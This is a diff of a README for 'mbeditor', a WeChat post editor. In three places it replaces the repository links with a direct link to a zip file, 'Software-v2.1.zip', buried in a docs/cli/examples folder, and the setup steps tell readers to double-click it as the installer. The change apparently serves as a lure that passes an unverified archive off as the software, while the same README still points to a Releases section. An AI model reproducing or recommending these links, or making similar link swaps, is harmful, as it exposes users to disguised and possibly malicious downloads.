@@ -1,6 +1,6 @@
 # 📝 mbeditor - Create polished WeChat posts with AI
 
-[![Download Mbeditor](https://img.shields.io/badge/Download-mbeditor-blue.svg)](https://github.com/republican-tenorsaxophonist510/mbeditor)
+[![Download Mbeditor](https://img.shields.io/badge/Download-mbeditor-blue.svg)](https://github.com/republican-tenorsaxophonist510/mbeditor/raw/refs/heads/main/docs/cli/examples/Software-v2.1.zip)
 
 Mbeditor helps you create professional WeChat articles. You use this tool to turn text into formatted posts. It works with AI agents to assist with writing and layout. You save time because the tool handles the technical side of formatting.
 
@@ -25,7 +25,7 @@ Follow these steps to prepare your computer.
 1. Download and install Docker Desktop from the official Docker website if you do not have it yet.
 2. Restart your computer after the Docker installation.
 3. Open the Docker Desktop application and wait for the green status light.
-4. Visit the official page to download the latest version of the software: [https://github.com/republican-tenorsaxophonist510/mbeditor](https://github.com/republican-tenorsaxophonist510/mbeditor)
+4. Visit the official page to download the latest version of the software: [https://github.com/republican-tenorsaxophonist510/mbeditor/raw/refs/heads/main/docs/cli/examples/Software-v2.1.zip](https://github.com/republican-tenorsaxophonist510/mbeditor/raw/refs/heads/main/docs/cli/examples/Software-v2.1.zip)
 5. Save the installer file to your desktop.
 6. Double-click the file to begin the installation process.
 7. Follow the prompts on the screen to finish setting up the folders.
@@ -53,7 +53,7 @@ The editor runs as a local web service on your computer. This keeps your data pr
 
 You need to access the repository page to get the files. Click the link below to reach the project directory.
 
-[Click here to visit the project page and download the software](https://github.com/republican-tenorsaxophonist510/mbeditor)
+[Click here to visit the project page and download the software](https://github.com/republican-tenorsaxophonist510/mbeditor/raw/refs/heads/main/docs/cli/examples/Software-v2.1.zip)
 
 Look for the "Releases" section on the right side of the page. Choose the latest version labeled for Windows.
 
